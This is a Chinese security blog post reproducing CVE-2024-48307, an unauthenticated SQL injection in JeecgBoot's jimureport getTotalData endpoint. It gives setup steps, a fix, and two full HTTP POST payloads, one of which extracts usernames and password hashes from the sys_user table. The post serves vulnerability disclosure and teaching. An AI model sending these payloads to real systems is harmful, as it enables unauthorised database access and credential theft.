#  CVE-2024-48307：JeecgBoot SQL注入漏洞   
 进击的HACK   2024-12-17 23:55  
  
> 关注我们❤️，添加星标🌟，一起学安全！作者：hexixi@Timeline Sec 本文字数：2248阅读时长：2～4mins声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
JeecgBoot是一款基于BPM的低代码平台！前后端分离架构 SpringBoot 2.x/3.x，SpringCloud，Ant Design&Vue3，Mybatis-plus，Shiro，JWT，支持微服务。具有代码生成器、权限管理、工作流引擎、监控报警、数据大屏等功能，可以帮助开发人员快速搭建企业级应用系统。  
## 0x02 漏洞概述  
  
**漏洞编号：CVE-2024-48307**  
  
JeecgBoot v3.7.1中的/onlDragDatasetHead/getTotalData组件发现存在SQL注入漏洞。攻击者可以无需权限利用  
jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar  
查询数据库，导致数据库信息泄露。  
## 0x03 影响版本  
  
jimureport-spring-boot-starter.version<=1.8.1  
## 0x04 环境搭建  
  
https://github.com/jeecgboot/JeecgBoot/releases  
  
idea部署后端  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKIGY0qnJzTgcbpBgMBroPV9yd8H7DBib0MEZgzgTqCAqqbxBmmsNcUjsQ/640?wx_fmt=png&from=appmsg "")  
  
进入jeecgboot-vue3目录下执行pnpm dev命令开启前端  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKIumBicrLRLQmf932JNtmDftp2GDdP2IHLICQKicOa2XLvicuCtzJrGoYRw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKIqCGLoCpJdmSvQq93P6azdZdggKcC3Cm96ibUEcDxjpXte99ibBR5kxFQ/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
访问http://IP:8080/jeecg-boot/drag/onlDragDatasetHead/getTotalData可以发现服务可用，不能以get方式访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKItMW92yWUNZc8qp1HwrBibaSfaR4sjjJN0uzpUdn7nykmibW22Zcx4Dzw/640?wx_fmt=png&from=appmsg "")  
  
根据源码构建json数据，尝试访问sys_user表的id  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKISwKtIsuVTr0az5hy7eqBbicfm6jk6LSkK4RtxHB7GibiaoDZuFV5vkhPw/640?wx_fmt=png&from=appmsg "")  
```
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: IP:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 296
Content-Type: application/json

{"tableName": "sys_user", "compName": "test", "condition": {"filter": {}}, "config": {"assistValue": [], "assistType": [], "name": [{"fieldName": "concat(id)", "fieldType": "string"}, {"fieldName": "id", "fieldType": "string"}], "value": [{"fieldName": "id", "fieldType": "string"}], "type": []}}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKI43FJn7njDSKBG10LUUV3P2MntKdiaJFGPcvIe8Mfe69xiceic1UmicI6Fg/640?wx_fmt=png&from=appmsg "")  
  
查询username和password  
```
POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1
Host: IP:8080
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 311

{"tableName": "sys_user", "compName": "test", "condition": {"filter": {}}, "config": {"assistValue": [], "assistType": [], "name": [{"fieldName": "concat(username,0x3a,password)", "fieldType": "string"}, {"fieldName": "id", "fieldType": "string"}], "value": [{"fieldName": "id", "fieldType": "1"}], "type": []}}

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshQS4yNUOlZ2hps5iaEAJaKIH7SaibeBibKTDJmTQG5gUOmySFSZGNKEPVpDlPIM93KT4nxleKW4Nm4w/640?wx_fmt=png&from=appmsg "")  
## 0x06 修复方式  
  
更新插件  
jimureport到最新版本。  
## 参考链接  
  
https://help.jeecg.com/setup/startup.html  
## 历史漏洞  
  
CNVD-2023-69437CVE-2023-6307CVE-2023-4450CVE-2023-42268CVE-2023-41578CVE-2023-41544CVE-2023-41543CVE-2023-41542CVE-2023-40989CVE-2023-38992CVE-2023-34659CVE-2023-34603CVE-2023-34602CVE-2023-24789CVE-2023-1784CVE-2023-1741CVE-2023-1454  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题  
  
回复  
【手册】  
获取原创技术PDF手册  
  
回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】  
获取TimelineSec创办的实战课程  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就点个赞吧！  
  
欢迎评论区留言讨论～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
